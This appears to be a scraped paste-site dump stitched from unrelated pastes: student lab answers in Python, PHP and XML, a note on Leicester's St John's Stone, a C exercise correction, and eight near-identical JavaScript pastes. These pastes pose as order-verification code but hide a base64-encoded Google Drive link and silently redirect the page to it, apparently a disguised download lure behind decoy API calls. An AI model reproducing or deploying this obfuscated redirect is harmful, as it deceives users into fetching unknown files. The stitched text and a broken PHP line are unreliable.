plt.imshow(wordcloud)
plt.axis(""off"")
plt.show()

Slip No: 20
Q.1) create a student.xml file containing at least 5 student information
Solution:
<!-- student.xml -->
<?xml version=""1.0"" encoding=""UTF-8""?>
<Students>
    <Student><id>1</id><name>John</name><course>CS</course></Student>
    <Student><id>2</id><name>Jane</name><course>IT</course></Student>
    <Student><id>3</id><name>Tom</name><course>CS</course></Student>
    <Student><id>4</id><name>Lisa</name><course>IT</course></Student>
    <Student><id>5</id><name>Mike</name><course>CS</course></Student>
</Students>

Q.2) Consider text paragraph. ""Hello all, Welcome to Python Programming Academy. Python Programming Academy is a nice platform to learn new programming skills. It is difficult to get enrolled in this Academy. ""Remove the stopwords.
Solution:
import nltk
from nltk.corpus import stopwords
from nltk.tokenize import word_tokenize

nltk.download('punkt')
nltk.download('stopwords')
text = ""Hello all, Welcome to Python Programming Academy. Python Programming Academy is a nice platform to learn new programming skills. It is difficult to get enrolled in this Academy.""
stop_words = set(stopwords.words('english'))
words = word_tokenize(text.lower())
filtered = [w for w in words if w not in stop_words]
print(""Filtered Words:"", filtered)

Slip No: 24
Q.1) Write a PHP script to create student.xml file which contains student roll no, name, address, college and course. Print students detail of specific course in tabular format after accepting course as input.
Solution:
<?php
if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
    $xml = new DOMDocument(""1.0"");
    $root = $xml->createElement(""Students"");
    $xml->appendChild($root);
    $students = [
        [""roll"" => 1, ""name"" => ""John"", ""address"" => ""Addr1"", ""college"" => ""XYZ"", ""course"" => ""CS""],
        [""roll"" => 2, ""name"" => ""Jane"", ""address"" => ""Addr2"", ""college"" => ""ABC"", ""course"" => ""IT""],
        [""roll"" => 3, ""name"" => ""Tom"", ""address"" => ""Addr3"", ""college"" => ""XYZ"", ""course"" => ""CS""]
    ];
    foreach ($students as $s) {
        $student = $xml->createElement(""Student"");
        foreach ($s as $key => $value) {
            $elem = $xml->createElement($key, $value);
            $student->appendChild($elem);
        }
        $root->appendChild($student);
    }
    $xml->save(""student.xml"");

    $course = $_POST['course'];
    $xml = simplexml_load_file(""student.xml"");
    echo ""<table border='1'><tr><th>Roll</th><th>Name</th><th>Address</th><th>College</th><th>Course</th></tr>"";
    foreach ($xml->Student as $student) {
        if ($student->course == $course) {
            echo ""<tr><td>$student->roll</td><td>$student->name</td><td>$student->address</td><td>$student->college</td><td>$student->course</td></tr>"";
        }
    }
    echo ""</table>"";
}
?>
<form method=""post"">
    Course: <input type=""text"" name=""course""><br>
    <input type=""submit"" value=""Show Students"">
</form>

Q.2) Consider the following dataset : https://www.kaggle.com/datasets/datasnaek/youtubenew?select=INvideos.csv Write a Python script for the following : i. Read the dataset and perform data cleaning operations on it. ii. ii. Find the total views, total likes, total dislikes and comment count.
Solution:
import pandas as pd

df = pd.read_csv('INvideos.csv')  # Replace with actual path
df.dropna(inplace=True)
print(""Total Views:"", df['views'].sum())
print(""Total Likes:"", df['likes'].sum())
print(""Total Dislikes:"", df['dislikes'].sum())
print(""Total Comments:"", df['comment_count'].sum())

Slip No: 25
Q.1) Write a script to create ""cricket.xml"" file with multiple elements as shown below:
    <CricketTeam>
        <Team country=""Australia"">
            <player> </player>
            <runs> </runs>
            <wicket> </wicket>
        </Team>
    </CricketTeam>
Write a script to add multiple elements in ""cricket.xml"" file of category, country=""India"".
Solution:
<?php
$xml = new DOMDocument(""1.0"");
$root = $xml->createElement(""CricketTeam"");
$xml->appendChild($root);
$team = $xml->createElement(""Team"");
$team->setAttribute(""country"", ""Australia"");
$root->appendChild($team);
$xml->save(""cricket.xml"");

// Add India team
$xml = simplexml_load_file(""cricket.xml"");
$team = $xml->addChild(""Team"");
$team->addAttribute(""country"", ""India"");
$team->addChild(""player"", ""Virat"");
$team->addChild(""runs"", ""5000"");
$team->addChild(""wicket"", ""10"");
$xml->asXML(""cricket.xml"");
echo ""India team added!"";
?>

Q.2) Consider the following dataset : https://www.kaggle.com/datasets/seungguini/youtube-commentsfor-covid19-relatedvideos?select=covid_2021_1.csv Write a Python script for the following : i. Read the dataset and perform data cleaning operations on it. ii. ii. Tokenize the comments in words. iii. Perform sentiment analysis and find the percentage of positive, negative and neutral comments.
Solution:
import pandas as pd
from nltk.sentiment import SentimentIntensityAnalyzer
import nltk

nltk.download('vader_lexicon')
df = pd.read_csv('covid_2021_1.csv')  # Replace with actual path
sia = SentimentIntensityAnalyzer()
df['sentiment'] = df['comments'].apply(lambda x: sia.polarity_scores(x)['compound'])
positive = len(df[df['sentiment'] > 0]) / len(df) * 100
negative = len(df[df['sentiment'] < 0]) / len(df) * 100
neutral = len(df[df['sentiment'] == 0]) / len(df) * 100
print(f""Positive: {positive}%, Negative: {negative}%, Neutral: {neutral}%"")

Slip No: 29
Q.1) Write a PHP script for the following: Design a form to accept a number from the user. Perform the operations and show the results. 1) Fibonacci Series. 2) To find sum of the digits of that number. (Use the concept of self processing page.)
Solution:
<?php
if ($_ SERVER[""REQUEST_METHOD""] == ""POST"") {
    $num = $_POST['number'];
    // Fibonacci
    $fib = [0, 1];
    for ($i = 2; $i < $num; $i++) {
        $fib[] = $fib[$i-1] + $fib[$i-2];
    }
    echo ""Fibonacci Series: "" . implode("", "", array_slice($fib, 0, $num)) . ""<br>"";
    // Sum of digits
    $sum = array_sum(str_split($num));
    echo ""Sum of digits: $sum"";
}
?>
<form method=""post"">
    Number: <input type=""number"" name=""number""><br>
    <input type=""submit"" value=""Calculate"">
</form>

Q.2) Build a logistic regression model for Student Score Dataset.
Solution:
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression

data = {'Hours': [2, 3, 4, 5, 6], 'Score': [50, 60, 70, 80, 90], 'Pass': [0, 0, 1, 1, 1]}
df = pd.DataFrame(data)
X = df[['Hours', 'Score']]
y = df['Pass']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
model = LogisticRegression()
model.fit(X_train, y_train)
print(""Accuracy:"", model.score(X_test, y_test))

Slip No: 30
Q.1) Create a XML file which gives details of books available in ""Bookstore"" from following categories. 1) Yoga 2) Story 3) Technical and elements in each category are in the following format <Book> <Book_Title> <Book_Title> <Book_Author> <Book_Author> <Book_Price> <Book_Price> </Book>
Solution:
<!-- bookstore.xml -->
<?xml version=""1.0"" encoding=""UTF-8""?>
<Bookstore>
    <Book category=""Yoga"">
        <Book_Title>Yoga Basics</Book_Title>
        <Book_Author>Swami Ji</Book_Author>
        <Book_Price>300</Book_Price>
    </Book>
    <Book category=""Story"">
        <Book_Title>Short Tales</Book_Title>
        <Book_Author>Jane Doe</Book_Author>
        <Book_Price>200</Book_Price>
    </Book>
    <Book category=""Technical"">
        <Book_Title>Python Guide</Book_Title>
        <Book_Author>John Smith</Book_Author>
        <Book_Price>500</Book_Price>
    </Book>
</Bookstore>

Q.2) Consider the following dataset : https://www.kaggle.com/datasets/datasnaek/youtubenew?select=INvideos.csv Write a Python script for the following : i. Read the dataset and perform data cleaning operations on it. ii. Find the total views, total likes, total dislikes and comment count.
Solution:
import pandas as pd

df = pd.read_csv('INvideos.csv')  # Replace with actual path
df.dropna(inplace=True)
print(""Total Views:"", df['views'].sum())
print(""Total Likes:"", df['likes'].sum())
print(""Total Dislikes:"", df['dislikes'].sum())
print(""Total Comments:"", df['comment_count'].sum())"
mtZ7k2KH,Market.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 10:14:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/696/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Wq5tgSEU,Medieval Leicester - St John's Stone,pigsonthewing,HTML,Wednesday 26th of March 2025 10:09:50 AM CDT,"From: https://x.com/historyofLeice1/status/1632690290074046465

https://x.com/historyofLeice1/status/1632690290074046465/photo/2

Medieval Leicester

St John's Stone

Origins

The St John's Stone stood in open fields on Leicester Abbey land in an area called Johnstone Close. Although now destroyed, the stone is thought to have originally been part of a Bronze Age stone circle some 5000 years old. The earliest known historical reference to the stone, however dates, to the year 1831.

For centuries, it had great significance for local people. Early in the nineteenth century, a semi-circular amphitheatre was hewn from the hillside so people could  sit and look at it. It then stood some seven feet high. The Leicester artist John Flower made a drawing of it in 1815 when it was still a substantial edifice, but by 1835 it had become reduced to about three feet by people breaking off pieces of its soft sandstone.

Legend and Mythology

It is claimed that the sunrise on Midsummer's Day aligns Saint John’s Stone with the Humber Stone, which lies to the east. Others claim that the two stones align on May Day, the Feast of Beltane.

It is said that the stone was frequented by fairies, who would dance around it at sundown. A custom which survived until the nineteenth century involved visits to the stone on St John’s Day (24 June) for a festival echoing ancient fire and sun worship.

Where is the stone today?

While fragments claimed to be from the stone can be found in St. Luke's Church, Stocking Farm, nothing now exists at its original location. The place where the stone once stood is now within a private property on Somerset Avenue, in the suburbs off the city’s Blackbird Road/ Stadium Estate."
mFc8JAcQ,Untitled,navrajkhunger,JavaScript,Wednesday 26th of March 2025 09:58:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/111/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NvswU2SL,Products.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 09:43:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/265/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7vEGNeNr,Order.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 09:28:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/244/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
crQxTbAp,Untitled,midnight_sun,C,Wednesday 26th of March 2025 09:20:23 AM CDT,"#include<stdio.h>
int main() {
	//char age -> 세미콜론 미작성
	char age;

	//scanf(""&c"", age); -> &c가 아닌 %c, scanf를 해줄때는 변수 앞에 &를 붙여주어야 하기에 age가 아닌 &age
	scanf(""%c"", &age);

	//printf(""&d"", age); -> &d가 아닌 %d
	printf(""%d"", age);

	/*
	서식문자에 대한 공부 필요성이 느껴짐

	문자를 입력 받고 숫자를 출력하려고 노력한 점은 좋았음
	*/
	return 0;
}
"
e97ygaps,Market.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 09:12:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/558/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2KPbcgNR,Untitled,navrajkhunger,JavaScript,Wednesday 26th of March 2025 08:57:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/835/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uLHcxG0A,Products.js,luqlegal,JavaScript,Wednesday 26th of March 2025 08:41:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/004/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
d3pCpgce,Order.js,luqlegal,JavaScript,Wednesday 26th of March 2025 08:26:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/935/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
